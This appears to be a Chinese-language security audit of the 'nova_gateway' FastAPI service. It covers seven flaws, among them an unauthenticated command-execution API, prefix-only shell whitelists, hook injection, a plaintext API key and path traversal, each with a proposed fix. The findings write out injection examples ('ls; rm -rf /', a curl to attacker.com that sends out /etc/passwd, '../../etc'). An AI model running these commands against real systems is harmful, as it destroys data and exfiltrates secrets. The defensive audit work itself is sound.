# 安全 审查报告

## 发现的问题

1. **[无认证 API 暴露任意命令执行]**
   - **位置**: `src/nova_gateway/main.py:462-476` (`/api/review/run-tests`) 及全部 API 端点
   - **触发条件**: 服务启动后，任何能访问 `127.0.0.1:8765` 的进程或用户均可调用所有 API，无需任何认证。
   - **潜在后果**: 攻击者可调用 `/api/review/run-tests`、`/api/tool-calls/retry`、`/api/chat/sessions/{id}/stream` 等端点执行 shell 命令、读写工作区文件、修改运行时配置（含 API Key），实现完整的远程代码执行。
   - **修复方案**: 为 FastAPI 添加 Bearer Token 或 API Key 中间件认证。
     ```python
     from fastapi import Depends, HTTPException, Security
     from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer

     _API_TOKEN = os.getenv("NOVA_API_TOKEN", "")

     _security = HTTPBearer(auto_error=False)

     async def require_auth(credentials: HTTPAuthorizationCredentials = Security(_security)):
         if not _API_TOKEN:
             return  # 开发环境未设置 token 时跳过
         if not credentials or credentials.credentials != _API_TOKEN:
             raise HTTPException(status_code=401, detail="Unauthorized")

     # 在路由上添加 dependencies=[Depends(require_auth)]
     @app.get("/api/health", dependencies=[Depends(require_auth)])
     async def health() -> Health:
         ...
     ```

2. **[Shell 命令白名单绕过导致命令注入]**
   - **位置**: `src/nova_gateway/tools/workspace.py:947-976` (`_is_allowed_shell_command`)
   - **触发条件**: 白名单检查仅验证命令字符串的**前缀**是否匹配允许列表（如 `ls`、`python`、`git status`）。攻击者（或被诱导的模型）可构造 `ls; rm -rf /`、`python -c "import os; os.system('malicious')"` 等复合命令绕过检查。`shell=True` 执行时 shell 元字符（`;`、`&&`、`||`、`` ` ``、`$()`）均会被解释。
   - **潜在后果**: 绕过白名单执行任意系统命令，读取/删除/篡改工作区外文件，甚至获取系统权限。
   - **修复方案**: 将白名单检查改为严格匹配首 token 并禁止 shell 元字符，或改用 `shell=False` + `shlex.split`。
     ```python
     import re

     _SHELL_META_PATTERN = re.compile(r'[;|&`$(){}]')

     def _is_allowed_shell_command(self, command: str) -> bool:
         if _SHELL_META_PATTERN.search(command):
             return False
         try:
             tokens = shlex.split(command)
         except (IndexError, ValueError):
             return False
         if not tokens:
             return False
         first = tokens[0].lower()
         allowed_binaries = {"pwd", "ls", "find", "rg", "grep", "sed", "cat", "git", "python", "python3", "pytest", "node", "curl"}
         return first in allowed_binaries
     ```

3. **[Review 测试命令注入绕过]**
   - **位置**: `src/nova_gateway/review/manager.py:208-217` (`_is_allowed_test_command`)
   - **触发条件**: 白名单允许 `for f in tests/frontend` 前缀。攻击者可提交命令 `for f in tests/frontend; do curl attacker.com/steal?data=$(cat /etc/passwd); done`，该命令以允许的前缀开头，但后续 shell 代码会被执行。
   - **潜在后果**: 通过 `/api/review/run-tests` 端点在服务器上执行任意命令。
   - **修复方案**: 移除允许 shell 复合结构的前缀，改为严格匹配完整命令或参数化执行。
     ```python
     def _is_allowed_test_command(self, command: str) -> bool:
         allowed_commands = {
             "PYTHONPATH=src python3 -m unittest discover -s tests",
             "python3 -m unittest discover -s tests",
             "python3 -m compileall -q src tests",
             "pytest",
         }
         return command in allowed_commands
     ```

4. **[Hook 命令注入]**
   - **位置**: `src/nova_gateway/tools/hooks.py:113-132` (`_run_command_hook`)
   - **触发条件**: Hook 配置文件（`.nova/hooks.json`）中的 `command` 字段若为字符串，会以 `shell=True` 执行。若攻击者能写入该 JSON 文件（或通过 API 修改配置），可注入任意系统命令。配置中还可指定 `matcher: "*"` 匹配所有工具调用。
   - **潜在后果**: 每次工具调用前/后自动执行攻击者指定的任意命令，实现持久化后门。
   - **修复方案**: 对字符串命令强制 `shlex.split` 后以 `shell=False` 执行，或至少校验命令不含 shell 元字符。
     ```python
     def _run_command_hook(self, command: Any, payload: dict[str, Any], timeout_ms: int) -> dict[str, Any]:
         try:
             if isinstance(command, list):
                 cmd = command
             else:
                 cmd = shlex.split(str(command))
             result = subprocess.run(
                 cmd,
                 cwd=self.cwd,
                 input=json.dumps(payload, ensure_ascii=False),
                 text=True,
                 capture_output=True,
                 timeout=max(0.1, min(timeout_ms / 1000, 30)),
                 shell=False,
             )
         except (OSError, subprocess.SubprocessError) as exc:
             return {"permission_decision": "deny", "reason": f"Hook 执行失败：{exc}"}
         # ... 后续逻辑不变
     ```

5. **[API Key 明文写入磁盘]**
   - **位置**: `src/nova_gateway/providers/bigmodel.py:76-82` (`_write_runtime_api_key`)
   - **触发条件**: 调用 `/api/runtime/secrets` 设置 API Key 时，密钥以 JSON 明文写入 `.nova/runtime-secrets.json`，无文件权限控制。
   - **潜在后果**: 同机其他用户或进程可直接读取明文 API Key，导致模型服务被盗用。
   - **修复方案**: 写入文件时限制权限为仅所有者可读写。
     ```python
     import stat

     def _write_runtime_api_key(self, api_key_file: Path, api_key: str | None) -> None:
         api_key_file.parent.mkdir(parents=True, exist_ok=True)
         payload = {self.api_key_env: api_key} if api_key else {}
         api_key_file.write_text(
             json.dumps(payload, ensure_ascii=False, indent=2),
             encoding="utf-8",
         )
         api_key_file.chmod(stat.S_IRUSR | stat.S_IWUSR)  # 0600
     ```

6. **[API Key 信息泄露]**
   - **位置**: `src/nova_gateway/main.py:262-271` (`/api/provider`)
   - **触发条件**: 任何用户访问 `/api/provider` 端点。
   - **潜在后果**: 响应中包含 `api_key_env`（环境变量名）、`api_key_source`（来源类型）等信息，降低攻击者获取密钥的难度。
   - **修复方案**: 从公开响应中移除敏感字段。
     ```python
     @app.get("/api/provider")
     async def provider_status() -> dict:
         return {
             "provider": "bigmodel",
             "model": provider.model,
             "configured": provider.is_configured(),
         }
     ```

7. **[worktree 名称路径遍历]**
   - **位置**: `src/nova_gateway/main.py:849-859` (`/api/worktrees/{name:path}`)
   - **触发条件**: FastAPI 的 `{name:path}` 路径参数会捕获包含 `/` 的路径段。攻击者可提交 `DELETE /api/worktrees/../../etc` 尝试路径遍历。
   - **潜在后果**: 若 `WorktreeManager.remove` 未对 name 做清理，可能删除工作区外的目录。
   - **修复方案**: 在 `WorktreeManager.remove` 内部验证 name 不包含路径遍历字符，或改为显式查询参数。
     ```python
     @app.delete("/api/worktrees/{name}")
     async def delete_worktree(name: str, discard: bool = Query(default=False)) -> dict:
         if ".." in name or "/" in name or "\\" in name:
             raise HTTPException(status_code=400, detail="无效的工作树名称")
         # ... 后续逻辑不变
     ```
